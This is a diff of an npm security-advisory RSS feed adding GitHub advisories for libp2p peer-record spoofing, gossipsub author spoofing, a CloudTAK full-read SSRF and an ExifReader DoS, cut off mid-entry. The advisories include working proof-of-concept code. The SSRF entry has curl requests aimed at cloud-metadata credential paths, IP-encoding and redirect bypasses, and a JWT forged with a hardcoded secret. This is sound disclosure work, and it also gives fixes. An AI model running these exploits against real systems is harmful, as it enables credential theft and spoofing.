@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-09-17T15:03:16.341Z</updated>
+    <updated>2026-09-17T18:57:05.149Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,630 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@libp2p/peer-store] libp2p: PeerStore accepts attacker-signed PeerRecords for a victim peer ID and stores certified attacker addresses]]></title>
+        <id>https://github.com/advisories/GHSA-vrf4-mx87-p53w</id>
+        <link href="https://github.com/advisories/GHSA-vrf4-mx87-p53w"/>
+        <updated>2026-09-17T18:01:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>@libp2p/peer-store</code> accepts a signed <code>PeerRecord</code> whose envelope is signed by one peer but whose payload claims a different peer ID. The vulnerable <code>consumePeerRecord</code> path verifies the envelope signature, but does not verify that the envelope signer is the same peer as the wrapped <code>PeerRecord.peerId</code>. As a result, an attacker can sign a record with their own key while placing a victim peer ID in the payload, causing attacker-controlled multiaddrs to be stored as certified addresses for the victim.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable code is in <code>packages/peer-store/src/index.ts</code>:</p>
+<ul>
+<li><code>RecordEnvelope.openAndCertify(buf, PeerRecord.DOMAIN, options)</code> verifies the envelope signature.</li>
+<li><code>const peerId = peerIdFromCID(envelope.publicKey.toCID())</code> derives the envelope signer peer ID.</li>
+<li>The optional <code>expectedPeer</code> check only compares <code>expectedPeer</code> to the envelope signer.</li>
+<li><code>const peerRecord = PeerRecord.createFromProtobuf(envelope.payload)</code> decodes <code>peerRecord.peerId</code> from attacker-controlled signed payload bytes.</li>
+<li><code>this.patch(peerRecord.peerId, { peerRecordEnvelope: buf, addresses: ... isCertified: true })</code> stores the addresses under the payload peer ID, not the verified signer peer ID.</li>
+</ul>
+<p>The missing invariant is:</p>
+<pre><code class="language-ts">peerRecord.peerId.equals(peerIdFromCID(envelope.publicKey.toCID()))
+</code></pre>
+<p><code>packages/protocol-identify/src/utils.ts</code> already performs this check and can be used as the reference behavior:</p>
+<pre><code class="language-ts">if (!peerRecord.peerId.equals(envelopePeer)) {
+  throw new InvalidMessageError('signing key does not match PeerId in the PeerRecord')
+}
+</code></pre>
+<p>The gossipsub Peer Exchange path reaches this code via <code>packages/gossipsub/src/gossipsub.ts</code> by calling:</p>
+<pre><code class="language-ts">peerStore.consumePeerRecord(pi.signedPeerRecord, { expectedPeer: peer })
+</code></pre>
+<p>This does not prevent the bug because <code>peer</code> is derived from the wire <code>pi.peerID</code>. An attacker can set <code>pi.peerID</code> to their own peer ID, sign the envelope with their own key, and put the victim peer ID inside the wrapped <code>PeerRecord</code>.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-ts">// TypeScript ESM PoC.
+import { strict as assert } from 'node:assert'
+import { generateKeyPair } from '@libp2p/crypto/keys'
+import { defaultLogger } from '@libp2p/logger'
+import { peerIdFromPrivateKey } from '@libp2p/peer-id'
+import { PeerRecord, RecordEnvelope } from '@libp2p/peer-record'
+import { persistentPeerStore } from '@libp2p/peer-store'
+import { multiaddr } from '@multiformats/multiaddr'
+import { MemoryDatastore } from 'datastore-core/memory'
+import { TypedEventEmitter } from 'main-event'
+
+const label = 'Certified peer-record address hijack'
+
+async function main (): Promise&lt;void&gt; {
+  const localKey = await generateKeyPair('Ed25519')
+  const attackerKey = await generateKeyPair('Ed25519')
+  const victimKey = await generateKeyPair('Ed25519')
+
+  const attacker = peerIdFromPrivateKey(attackerKey)
+  const victim = peerIdFromPrivateKey(victimKey)
+  const attackerAddr = multiaddr('/ip4/203.0.113.66/tcp/4001')
+
+  const peerStore = persistentPeerStore({
+    peerId: peerIdFromPrivateKey(localKey),
+    datastore: new MemoryDatastore(),
+    events: new TypedEventEmitter(),
+    logger: defaultLogger()
+  })
+
+  // Payload claims victim, but the envelope is signed by attacker.
+  const forgedRecord = new PeerRecord({
+    peerId: victim,
+    multiaddrs: [attackerAddr],
+    seqNumber: 999999n
+  })
+  const forgedEnvelope = await RecordEnvelope.seal(forgedRecord, attackerKey)
+
+  // Emulates gossipsub PX: pi.peerID == attacker, expectedPeer == attacker.
+  const accepted = await peerStore.consumePeerRecord(forgedEnvelope.marshal(), {
+    expectedPeer: attacker
+  })
+
+  assert.equal(accepted, true)
+
+  const poisonedVictim = await peerStore.get(victim)
+  assert.deepEqual(poisonedVictim.addresses.map(({ multiaddr, isCertified }) =&gt; ({
+    multiaddr: multiaddr.toString(),
+    isCertified
+  })), [{
+    multiaddr: attackerAddr.toString(),
+    isCertified: true
+  }])
+
+  console.log(`${label} reproduced`)
+  console.log(`attacker signer: ${attacker}`)
+  console.log(`victim storage key: ${victim}`)
+  console.log(`stored certified address: ${attackerAddr}`)
+}
+
+main().catch(err =&gt; {
+  console.error(err)
+  process.exitCode = 1
+})
+</code></pre>
+<p>Expected output:</p>
+<pre><code class="language-text">Certified peer-record address hijack reproduced
+attacker signer: 12D3KooWEdL1GaEhVGrhsKhubbiNQxWYTbX27ywm5JJ6W5Zh81gj
+victim storage key: 12D3KooWCZBY7mRMDfuWSR9p4X6qJQgNyYXrrnzozW4zSUPSJUFn
+stored certified address: /ip4/203.0.113.66/tcp/4001
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Attackers can poison peer-store certified address records for third-party peers. Certified addresses are preferred by dial address sorting, so future dials to the victim may attempt attacker-controlled or invalid endpoints. This can cause reachability disruption, address-book poisoning, and routing manipulation for applications that consume untrusted signed peer records.</p>
+<p>This does not by itself let the attacker complete an encrypted libp2p connection as the victim, because the connection upgrade path still verifies the remote peer identity. The demonstrated impact is certified address poisoning and dial redirection/failure, not a full peer identity takeover.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/pull/3570">https://github.com/libp2p/js-libp2p/pull/3570</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30">https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24">https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24</a></li>
+<li><a href="https://github.com/advisories/GHSA-vrf4-mx87-p53w">https://github.com/advisories/GHSA-vrf4-mx87-p53w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vrf4-mx87-p53w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-17T18:01:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@libp2p/gossipsub] libp2p: Gossipsub StrictSign accepts attacker-signed messages as a victim RSA peer ID]]></title>
+        <id>https://github.com/advisories/GHSA-c3gv-825q-fvmp</id>
+        <link href="https://github.com/advisories/GHSA-c3gv-825q-fvmp"/>
+        <updated>2026-09-17T17:29:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>@libp2p/gossipsub</code> <code>StrictSign</code> validation does not bind a supplied message public key to the claimed <code>from</code> peer ID when <code>from</code> is an RSA-style peer ID that does not inline its public key. An attacker can set <code>from</code> to a victim RSA peer ID, sign the message with the attacker's own private key, include the attacker's public key in <code>msg.key</code>, and have the message accepted as a valid signed message from the victim.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable code is in <code>packages/gossipsub/src/utils/buildRawMessage.ts</code> inside <code>validateToRawMessage</code>.</p>
+<p>When <code>msg.key</code> is present:</p>
+<pre><code class="language-ts">publicKey = publicKeyFromProtobuf(msg.key)
+if (fromPeerId.publicKey !== undefined &amp;&amp; !publicKey.equals(fromPeerId.publicKey)) {
+  return { valid: false, error: ValidateError.InvalidPeerId }
+}
+</code></pre>
+<p>For RSA peer IDs parsed from the wire <code>from</code> multihash, <code>fromPeerId.publicKey</code> is undefined because the RSA public key is not inlined in the peer ID. This means the key-to-<code>from</code> comparison is skipped. The code then verifies the signature with the attacker-supplied <code>msg.key</code> and returns a signed message whose <code>from</code> is the victim RSA peer ID.</p>
+<p>The missing invariant is:</p>
+<pre><code class="language-ts">peerIdFromPublicKey(publicKey).equals(fromPeerId)
+</code></pre>
+<p>This check must be performed whenever a public key is supplied, including keyless peer ID representations such as RSA peer IDs.</p>
+<p><code>StrictSign</code> is the default gossipsub signature policy in <code>packages/gossipsub/src/gossipsub.ts</code>:</p>
+<pre><code class="language-ts">this.globalSignaturePolicy = opts.globalSignaturePolicy ?? StrictSign
+</code></pre>
+<p>Version tracing:</p>
+<ul>
+<li><code>git blame</code> points the vulnerable <code>validateToRawMessage</code> block to <code>9a9b11fd44</code> (<code>fix!: remove pubsub (#3291)</code>), which introduced <code>packages/gossipsub/src/utils/buildRawMessage.ts</code>.</li>
+<li>That commit's <code>packages/gossipsub/package.json</code> still reports <code>14.1.1</code>, but the first <code>gossipsub-v*</code> release tag in this checkout that contains the vulnerable block is <code>gossipsub-v15.0.0</code>.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-ts">// TypeScript ESM PoC.
+import { strict as assert } from 'node:assert'
+import { generateKeyPair, publicKeyToProtobuf } from '@libp2p/crypto/keys'
+import { StrictSign } from '@libp2p/gossipsub'
+import { peerIdFromPrivateKey } from '@libp2p/peer-id'
+import { concat as uint8ArrayConcat } from 'uint8arrays/concat'
+import { fromString as uint8ArrayFromString } from 'uint8arrays/from-string'
+import { RPC } from '../../packages/gossipsub/dist/src/message/rpc.js'
+import { SignPrefix, validateToRawMessage } from '../../packages/gossipsub/dist/src/utils/buildRawMessage.js'
+
+const label = 'gossipsub StrictSign RSA author spoof'
+
+function seqno (n: bigint): Uint8Array {
+  const out = new Uint8Array(8)
+  new DataView(out.buffer).setBigUint64(0, n, false)
+  return out
+}
+
+async function main (): Promise&lt;void&gt; {
+  const attackerKey = await generateKeyPair('Ed25519')
+  const victimRsaKey = await generateKeyPair('RSA', 512)
+  const victim = peerIdFromPrivateKey(victimRsaKey)
+
+  const msg: RPC.Message = {
+    from: victim.toMultihash().bytes,
+    data: uint8ArrayFromString('forged as victim RSA peer'),
+    seqno: seqno(1n),
+    topic: 'poc-topic',
+    signature: undefined,
+    key: undefined
+  }
+
+  // Sign the protobuf message that claims victim in `from`, using attacker's key.
+  const bytes = uint8ArrayConcat([SignPrefix, RPC.Message.encode(msg)])
+  msg.signature = await attackerKey.sign(bytes)
+  msg.key = publicKeyToProtobuf(attackerKey.publicKey)
+
+  const result = await validateToRawMessage(StrictSign, msg)
+
+  if (!result.valid) {
+    throw new Error(`expected forged message to validate, got ${result.error}`)
+  }
+
+  assert.equal(result.message.type, 'signed')
+  assert.equal(result.message.from.equals(victim), true)
+  assert.equal(result.message.key.equals(attackerKey.publicKey), true)
+
+  console.log(`${label} reproduced`)
+  console.log(`claimed victim RSA author: ${victim}`)
+  console.log('signature verified with attacker-supplied key')
+}
+
+main().catch(err =&gt; {
+  console.error(err)
+  process.exitCode = 1
+})
+</code></pre>
+<p>Expected output:</p>
+<pre><code class="language-text">gossipsub StrictSign RSA author spoof reproduced
+claimed victim RSA author: QmcFsT6SHgxy1LXcUbz4aNSn9Wcj6JsJSMsSjB3ud1wT4f
+signature verified with attacker-supplied key
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Attackers can forge gossipsub messages attributed to arbitrary victim RSA peer IDs under the default <code>StrictSign</code> policy. Applications that trust <code>message.from</code> in topic validators, authorization logic, accounting, moderation, reputation, or audit logs can be misled into treating attacker-controlled data as if it was authored by the victim.</p>
+<p>The forged message can also be considered valid by gossipsub's validation path and forwarded to peers, spreading the incorrect origin attribution through the pubsub mesh.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-c3gv-825q-fvmp">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-c3gv-825q-fvmp</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/pull/3569">https://github.com/libp2p/js-libp2p/pull/3569</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/commit/cec2b1f349d130065e561349a0336a239528267f">https://github.com/libp2p/js-libp2p/commit/cec2b1f349d130065e561349a0336a239528267f</a></li>
+<li><a href="https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v16.0.5">https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v16.0.5</a></li>
+<li><a href="https://github.com/advisories/GHSA-c3gv-825q-fvmp">https://github.com/advisories/GHSA-c3gv-825q-fvmp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c3gv-825q-fvmp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-17T17:29:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@tak-ps/cloudtak] TAK-PS-Stats Web UI: Authenticated full-read SSRF in CloudTAK basemap import (PUT /api/basemap) — no IP-classification guard]]></title>
+        <id>https://github.com/advisories/GHSA-vqrw-qphh-p34v</id>
+        <link href="https://github.com/advisories/GHSA-vqrw-qphh-p34v"/>
+        <updated>2026-09-17T17:03:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>PUT /api/basemap</code> (the basemap import endpoint) fetches an attacker-supplied URL server-side with <strong>no SSRF protection whatsoever</strong>. Any authenticated user can submit a JSON body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>; the server calls <code>fetch(url)</code> against that URL and then reflects the response body (<code>name</code>, <code>attribution</code>, <code>tiles[0]</code>, zoom levels) back to the caller in the <code>OptionalTileJSON</code> response.</p>
+<p>Because there is no IP-address classification, internal-only services are reachable: cloud metadata (<code>http://169.254.169.254/...</code>), loopback (<code>http://127.0.0.1/...</code>), RFC1918 ranges, and CGNAT. The response body flows back to the attacker, making this a <strong>full-read SSRF</strong> (not blind): the attacker reads the internal HTTP response verbatim. This enables theft of cloud instance credentials, internal service enumeration, and reading of internal-only HTTP endpoints from the network position of the CloudTAK API server.</p>
+<p>The only URL check in the basemap protocol layer (<code>BasemapProtocol.isValidURL</code>, <code>api/lib/interface-basemap.ts</code>) validates the scheme is <code>http</code>/<code>https</code> only and performs <strong>no host/IP filtering</strong> — and the import path does not even call it; it goes straight from <code>new URL(rawURL)</code> to <code>fetch(url)</code>.</p>
+<p>Three independent bypass classes were confirmed end-to-end against a real deployed build:</p>
+<ol>
+<li>Direct internal/loopback IP literals.</li>
+<li>Alternate IP encodings (e.g. decimal <code>http://2130706433/</code> = <code>127.0.0.1</code>).</li>
+<li>Redirect following — <code>fetch</code> uses the default <code>redirect: 'follow'</code>, so even a public initial host that 302-redirects to an internal address is followed with no re-validation.</li>
+</ol>
+<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
+<p><code>api/routes/basemap.ts</code> — <code>importBasemapURL()</code> and the <code>PUT /basemap</code> handler (line numbers at commit <code>90d43bdd2fb7d9bd57cbce28c709d9e5207a475a</code>):</p>
+<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136</a></p>
+<pre><code class="language-ts">// api/routes/basemap.ts
+async function importBasemapURL(
+    config: Config,
+    rawURL: string,
+    auth?: Static&lt;typeof BasemapImportAuth&gt;,
+): Promise&lt;Static&lt;typeof OptionalTileJSON&gt;&gt; {
+    const imported: Static&lt;typeof OptionalTileJSON&gt; = { type: Basemap_Type.RASTER };
+
+    let url: URL;
+    try {
+        url = new URL(rawURL);            // (1) only well-formedness is checked
+    } catch (err) {
+        throw new Err(400, err instanceof Error ? err : new Error(String(err)), 'Invalid URL');
+    }
+
+    if (isEsriLayerURL(String(url))) { /* ... ESRI proxy path ... */ }
+
+    const tjres = await fetch(url);        // (2) SSRF sink — no host/IP guard, default redirect:follow
+    if (!tjres.ok) throw new Err(400, null, 'Unable to fetch TileJSON from source URL');
+
+    const tjbody = await tjres.json() as Record&lt;string, any&gt;;
+    if (tjbody.name) imported.name = tjbody.name;               // (3) internal response reflected to caller
+    if (tjbody.attribution) imported.attribution = tjbody.attribution;
+    if (Array.isArray(tjbody.tiles) &amp;&amp; tjbody.tiles.length) {
+        imported.url = tjbody.tiles[0]...;
+    }
+    return imported;
+}
+</code></pre>
+<p>The handler at <code>api/routes/basemap.ts</code> L139–L233 mounts this as <code>PUT /api/basemap</code> and gates it only with <code>Auth.is_auth(config, req)</code> (L157), i.e. <strong>any authenticated user</strong> with <code>application/json</code> body <code>{ type, url }</code> reaches <code>importBasemapURL((req.body).url, (req.body).auth)</code>.</p>
+<p><code>BasemapProtocol.isValidURL</code> at <code>api/lib/interface-basemap.ts</code> L136 — the only "validation" in the protocol layer — checks the scheme only and performs no IP filtering:</p>
+<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148</a></p>
+<h3 id="how-input-reaches-the-sink">How input reaches the sink</h3>
+<ol>
+<li>Attacker authenticates as any CloudTAK user (any role) and obtains a bearer token.</li>
+<li>Attacker sends <code>PUT /api/basemap</code> with <code>Content-Type: application/json</code> and body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>.</li>
+<li>Handler <code>api/routes/basemap.ts</code> L155–L233 calls <code>Auth.is_auth(config, req)</code> (L157, any authenticated user passes) then <code>importBasemapURL(config, (req.body).url, (req.body).auth)</code> (L233).</li>
+<li><code>importBasemapURL</code> (L68) does <code>new URL(rawURL)</code> (L79) and, for non-ESRI URLs, reaches <code>const tjres = await fetch(url)</code> (L99) — the SSRF sink. No host/IP classification occurs anywhere on this path; <code>fetch</code> uses the default <code>redirect: 'follow'</code>.</li>
+<li>The response JSON is parsed (L104) and <code>name</code> / <code>attribution</code> / <code>tiles[0]</code> are copied into the response object (L106–L117) and returned to the attacker — closing the read loop.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Server-side full-read SSRF from the network position of the CloudTAK API server, reachable by any single authenticated user:</p>
+<ul>
+<li>Read the cloud instance metadata endpoint (<code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>) and exfiltrate temporary IAM credentials.</li>
+<li>Reach and read internal-only HTTP services (databases' HTTP UIs, admin panels, other microservices) not exposed to the internet.</li>
+<li>Enumerate internal hosts/ports via response/timing differences.</li>
+</ul>
+<p>Because the fetched body is reflected back to the caller, the attack is non-blind (full response disclosure), not merely a blind request-forgery.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>End-to-end reproduction against a <strong>real deployed CloudTAK API server</strong> (not a unit harness). An internal-only sentinel HTTP service is bound to <code>127.0.0.1:9000</code> (loopback only, unreachable from outside the host) and returns a TileJSON body carrying secret marker values; the proof is that the CloudTAK server fetches it server-side and reflects those secrets back to the attacker.</p>
+<ol>
+<li>Pinned install / build (v13.5.0, commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>):</li>
+</ol>
+<pre><code class="language-bash">git clone https://github.com/dfpc-coe/CloudTAK.git
+cd CloudTAK &amp;&amp; git checkout v13.5.0
+cd api &amp;&amp; npm ci
+# Postgres reachable at postgres://postgres@localhost:5432/tak_ps_etl (PostGIS-enabled)
+</code></pre>
+<ol start="2">
+<li>Deploy the real API server (test stack: SigningSecret defaults to the hardcoded <code>coe-wildland-fire</code>, migrations auto-apply, a default server row is auto-generated):</li>
+</ol>
+<pre><code class="language-bash">cd api
+StackName=test \
+SigningSecret=coe-wildland-fire \
+POSTGRES='postgres://postgres@localhost:5432/tak_ps_etl' \
+API_URL='http://localhost:5001' \
+npx tsx index.ts --noevents --nosinks --nogeofence
+# =&gt; "ok - http://localhost:5001"
+</code></pre>
+<ol start="3">
+<li>Internal-only sentinel (<code>internal_sentinel.js</code>) — simulates an internal HTTP service / metadata endpoint, bound to loopback only:</li>
+</ol>
+<pre><code class="language-js">const http = require('http');
+const fs = require('fs');
+const srv = http.createServer((req, res) =&gt; {
+  fs.appendFileSync('/tmp/ssrf_sentinel_hits.log',
+    `[HIT ${new Date().toISOString()}] ${req.method} ${req.url} from=${req.socket.remoteAddress}\n`);
+  res.setHeader('Content-Type', 'application/json');
+  res.end(JSON.stringify({
+    name: 'INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c',
+    attribution: 'leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e',
+    tiles: ['http://127.0.0.1:9000/internal/{z}/{x}/{y}.png'],
+    minzoom: 0, maxzoom: 19
+  }));
+});
+srv.listen(9000, '127.0.0.1', () =&gt; console.log('sentinel on 127.0.0.1:9000 (internal-only)'));
+</code></pre>
+<pre><code class="language-bash">node internal_sentinel.js &amp;
+# A redirector for the redirect-follow variant, also loopback-only:
+node -e "require('http').createServer((q,r)=&gt;{r.writeHead(302,{Location:'http://127.0.0.1:9000/via-302-redirect'});r.end();}).listen(9100,'127.0.0.1')" &amp;
+</code></pre>
+<ol start="4">
+<li>Attacker driver — mint a normal user JWT (signed with the deployed <code>SigningSecret</code>) and issue the three requests:</li>
+</ol>
+<pre><code class="language-bash">TOK=$(node -e "console.log(require('jsonwebtoken').sign({email:'attacker@evil.test',access:'user'},'coe-wildland-fire'))")
+
+# (a) loopback / metadata-style path
+curl -s -X PUT http://localhost:5001/api/basemap \
+  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+  -d '{"type":"raster","url":"http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/"}'
+
+# (b) decimal-IP encoding of 127.0.0.1
+curl -s -X PUT http://localhost:5001/api/basemap \
+  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+  -d '{"type":"raster","url":"http://2130706433:9000/decimal-ip-bypass"}'
+
+# (c) public-looking host that 302-redirects to internal (redirect:follow)
+curl -s -X PUT http://localhost:5001/api/basemap \
+  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+  -d '{"type":"raster","url":"http://127.0.0.1:9100/start"}'
+</code></pre>
+<ol start="5">
+<li>Captured output — all three return the internal sentinel's secret body to the attacker, and the loopback-only sentinel records the server-side hits:</li>
+</ol>
+<pre><code># HTTP response body returned to the attacker for (a), (b) and (c):
+{"type":"raster","name":"INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c",
+ "attribution":"leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e",
+ "maxzoom":19,"minzoom":0,"url":"http://127.0.0.1:9000/internal/{$z}/{$x}/{$y}.png","format":"png"}
+
+# /tmp/ssrf_sentinel_hits.log (sentinel is bound to 127.0.0.1 only):
+[HIT 2026-06-03T05:01:13.606Z] GET /latest/meta-data/iam/security-credentials/ from=127.0.0.1
+[HIT 2026-06-03T05:01:29.099Z] GET /decimal-ip-bypass from=127.0.0.1
+[HIT 2026-06-03T05:01:30.151Z] GET /via-302-redirect from=127.0.0.1
+</code></pre>
+<p>The <code>name</code> and <code>attribution</code> values returned to the attacker are read verbatim from the internal service's HTTP response, demonstrating full-read SSRF. In a real cloud deployment the equivalent request <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> returns instance-role credentials.</p>
+<ol start="6">
+<li>Negative control — a public host is fetched normally (the endpoint is not globally broken); only the <em>reachability</em> of internal addresses is the defect.</li>
+</ol>
+<h3 id="end-to-end-reproduction-against-pinned-version">End-to-end reproduction (against pinned version)</h3>
+<p>All of the above was executed against a real deployed CloudTAK API server built from tag <code>v13.5.0</code> (commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>), booted with <code>StackName=test</code> against a PostGIS-enabled Postgres so migrations and routes load unmodified. The vulnerable build returned the internal sentinel's secret body (<code>INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c</code>, <code>leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e</code>) for all three bypass variants, and the loopback-only sentinel recorded the three server-side hits shown above.</p>
+<p>After applying the fix below to the same deployed build and restarting, the exact same three attacker requests instead return:</p>
+<pre><code>{"status":403,"message":"URL resolves to a disallowed (internal) address","messages":[]}
+</code></pre>
+<p>and the sentinel log records <strong>no</strong> new hits, while <code>https://example.com/tile.json</code> continues to be fetched (returns <code>400 "Unable to fetch TileJSON"</code> — it reached the public host, the body just is not valid TileJSON). An <code>isBlockedIP</code> unit check passes 14/14: <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>100.64/10</code>, <code>::1</code>, <code>::ffff:127.0.0.1</code>, <code>fd00::/8</code>, <code>fe80::/10</code>, <code>64:ff9b::/96</code> all blocked; <code>8.8.8.8</code>, <code>1.1.1.1</code>, <code>93.184.216.34</code> all allowed.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Add an SSRF guard that (1) resolves the target hostname via DNS and rejects the request if <strong>any</strong> resolved address falls in a loopback / private / link-local (incl. <code>169.254.0.0/16</code> cloud metadata) / CGNAT / IPv6-ULA / IPv4-mapped / NAT64 range, and (2) follows redirects manually, re-validating the <code>Location</code> of every hop so a 302 to an internal address cannot bypass the check. Apply it to the import sink at <code>api/routes/basemap.ts</code> (the <code>fetch(url)</code> call) and to the ESRI/metadata fetch paths in the same file.</p>
+<p>A self-contained <code>safeFetch(url)</code> helper (DNS resolution + per-hop re-validation) replacing the bare <code>fetch(url)</code> is sufficient; the same helper should back the other user-URL fetches in the basemap routes. A fix PR implementing exactly this guard is provided.</p>
+<p>Note: a literal-string/prefix host blocklist (e.g. matching <code>127.</code>, <code>10.</code>, <code>192.168.</code>) is <strong>not</strong> sufficient — it is bypassed by alternate IP encodings, IPv6-mapped forms, and DNS-rebinding hostnames. The guard must classify the <strong>resolved</strong> numeric address.</p>
+<h3 id="severity">Severity</h3>
+<p>High. Pre-conditions: a single authenticated CloudTAK user account (any role). Impact: server-side full-read access to internal-only HTTP services and the cloud metadata endpoint from the API server's network position, enabling theft of instance credentials and internal reconnaissance. No additional privileges or victim interaction required.</p>
+<h3 id="fix-pr-link">Fix PR link</h3>
+<p>A fix PR implementing the DNS-resolving, redirect-re-validating <code>safeFetch</code> guard described above is provided to the maintainers via the private temporary fork associated with this advisory. The full guard source is also inlined under the Suggested fix section's reasoning above; the patch adds <code>api/lib/ssrf-guard.ts</code> and replaces the bare <code>fetch(url)</code> at <code>api/routes/basemap.ts</code> with <code>safeFetch(url)</code>.</p>
+<h3 id="credits">Credits</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v">https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v</a></li>
+<li><a href="https://github.com/dfpc-coe/CloudTAK/pull/1513">https://github.com/dfpc-coe/CloudTAK/pull/1513</a></li>
+<li><a href="https://github.com/dfpc-coe/CloudTAK/commit/1e0f6e65977c86fbc0aa15e308c43cbcaee23a7c">https://github.com/dfpc-coe/CloudTAK/commit/1e0f6e65977c86fbc0aa15e308c43cbcaee23a7c</a></li>
+<li><a href="https://github.com/dfpc-coe/CloudTAK/commit/556b35632877802c7e9c818db44aef7a2c3abebf">https://github.com/dfpc-coe/CloudTAK/commit/556b35632877802c7e9c818db44aef7a2c3abebf</a></li>
+<li><a href="https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.22.1">https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.22.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-vqrw-qphh-p34v">https://github.com/advisories/GHSA-vqrw-qphh-p34v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vqrw-qphh-p34v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-17T19:02:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[exifreader] ExifReader: DoS via Crafted HEIC/AVIF iloc Box - Memory Exhaustion]]></title>
+        <id>https://github.com/advisories/GHSA-pj96-35fp-cfcc</id>
+        <link href="https://github.com/advisories/GHSA-pj96-35fp-cfcc"/>
+        <updated>2026-09-17T16:30:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
